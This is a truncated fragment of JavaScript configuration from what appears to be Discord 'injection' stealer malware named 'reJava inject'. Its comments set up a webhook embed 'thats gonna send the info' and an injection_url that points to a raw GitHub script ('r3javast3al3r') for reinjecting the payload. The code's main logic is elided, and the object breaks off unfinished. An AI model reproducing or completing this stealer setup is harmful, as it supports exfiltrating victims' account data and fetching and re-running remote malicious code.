...
const config = {
  ...
  embed_name: 'reJava inject', //name of the webhook thats gonna send the info
  embed_icon: 'https://imgur.com/gallery/rejava-SkArr40'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 1000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  injection_url: 'https://raw.githubusercontent.com/VD23K23ZX94/r3javast3al3r/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        author: {
          ...
          icon_url: `https://imgur.com/gallery/rejava-SkArr40`,
        },
        footer: {
